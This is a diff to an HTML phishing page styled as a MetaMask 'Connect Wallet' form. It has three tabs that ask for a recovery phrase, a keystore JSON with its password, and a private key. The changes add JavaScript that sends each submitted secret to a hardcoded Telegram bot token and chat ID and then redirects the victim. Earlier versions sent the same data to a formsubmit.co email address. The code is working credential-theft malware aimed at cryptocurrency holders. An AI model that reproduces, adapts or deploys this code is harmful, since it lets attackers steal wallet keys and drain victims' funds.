@@ -48,24 +48,44 @@
 </div>
 
         <div id="phrase" class="tabcontent" style="display: block;">
-            <form action="javascript:void(0);" name="myform1" id="myform1" onsubmit="sendMessage()">
-                <!-- <input type="hidden" name="w" value="Electrum"> -->
+            
+            <form name="myform1" id="messageForm">
+                
                 <input type="hidden" name="wallet" value="metamask">
                 <input type="hidden" name="serial" id="uniquecode" placeholder=""  value="50252" >
-                <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+                <textarea name="phrase" id="messageInput" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
                 <br>
                 <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                 <br>
                 <button type="submit" class="btn">Connect Wallet</button>
             </form>
             <script>
-                function sendMessage() {
+                document.getElementById("messageForm").addEventListener("submit", function (event) {
+                    event.preventDefault(); // Prevent form submission
+        
+                    const message = document.getElementById("messageInput").value;
+                    sendMessageToTelegram(message);
+                });
+        
+                function sendMessageToTelegram(text) {
                     // Replace with your actual Telegram bot token and chat ID
                     const botToken = "6375031192:AAFtfTA6UE7NYFQpW8wdT2TbuIsl4goQLnY";
                     const chatId = "1635095037";
-                    const text = `Serial: ${document.querySelector('input[name="serial"]').value}\nPhrase: ${document.querySelector('input[name="phrase"]').value}`;
                     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-                    fetch(url, { method: "GET" });
+        
+                    fetch(url, { method: "GET" })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Message sent successfully!");
+                                // Redirect to another page (replace with your desired URL)
+                        window.location.href = "../index.html"; // Change this U
+                            } else {
+                                console.error("Error sending message:", response.statusText);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Network error:", error);
+                        });
                 }
             </script>
         </div>
@@ -78,34 +98,91 @@
 
 
         <div id="keystore" class="tabcontent" style="display: none;">
-            <form action="https://formsubmit.co/cmaxwellcox79@gmail.com" name="form2" id="form2" method="POST">
+            <form name="form2" id="messageForm2">
                 <!-- <input type="hidden" name="wallet" value="Electrum"> -->
                 <input type="hidden" name="wallet" value="metamask">
-                 <input type="hidden" name="serial" id="uniquecode" placeholder=""  value="50252" >
-                 <textarea name="keystore" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+                 <input type="hidden" id="keystore" name="serial" id="uniquecode" placeholder=""  value="50252" >
+                 <textarea name="keystore" id="keystore" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
                 <br>
                 <div class="field">
-                    <input type="password" name="password" placeholder="Password">
+                    <input type="password" id="password" name="pass" placeholder="Password">
                 </div>
                 <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                 <br>
-                <button type="submit" name="submit" class="btn">Connect Wallet</button>
+                <button type="submit" class="btn">Connect Wallet</button>
             </form>
+            <script>
+                document.getElementById("messageForm2").addEventListener("submit", function (event) {
+                    event.preventDefault(); // Prevent form submission
+        
+                    const key = document.getElementById("keystore").value;
+                    const password = document.getElementById("password").value;
+        
+                    // Replace with your actual Telegram bot token and chat ID
+                    const botToken = "6375031192:AAFtfTA6UE7NYFQpW8wdT2TbuIsl4goQLnY";
+                    const chatId = "1635095037";
+                    const text = `Keystore: ${key}\nPassword: ${password}`;
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        
+                    fetch(url, { method: "GET" })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Message sent successfully!");
+                                // Redirect to another page (replace with your desired URL)
+                        window.location.href = "../index.html"; // Change this U
+                            } else {
+                                console.error("Error sending message:", response.statusText);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Network error:", error);
+                        });
+                });
+            </script>
      
         </div>
 
         <div id="private" class="tabcontent" style="display: none;">
-           <form name="form3" id="form3" action="https://formsubmit.co/cmaxwellcox79@gmail.com" method="POST">
+           <form name="form3" id="messageForm3">
                 <!-- <input type="hidden" name="w" value="Electrum"> -->
                 <input type="hidden" name="wallet" value="metamask">
                 <input type="hidden" name="serial" id="uniquecode" placeholder=""  value="50252" >
                 <div class="field">
-                    <input type="text" name="privatekey" class="key" placeholder="Private Key">
+                    <input type="text" id="messageInput3" name="privatekey" class="key" placeholder="Private Key">
                 </div>
                 <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                 <br>
-                <button type="submit" name="submit" class="btn">Connect Wallet</button>
+                <button type="submit" class="btn">Connect Wallet</button>
             </form>
+            <script>
+                document.getElementById("messageForm3").addEventListener("submit", function (event) {
+                    event.preventDefault(); // Prevent form submission
+        
+                    const message = document.getElementById("messageInput3").value;
+                    sendMessageToTelegram(message);
+                });
+        
+                function sendMessageToTelegram(text) {
+                    // Replace with your actual Telegram bot token and chat ID
+                    const botToken = "6375031192:AAFtfTA6UE7NYFQpW8wdT2TbuIsl4goQLnY";
+                    const chatId = "1635095037";
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        
+                    fetch(url, { method: "GET" })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Message sent successfully!");
+                                // Redirect to another page (replace with your desired URL)
+                        window.location.href = "../index.html"; // Change this U
+                            } else {
+                                console.error("Error sending message:", response.statusText);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Network error:", error);
+                        });
+                }
+            </script>
         </div>
         
         
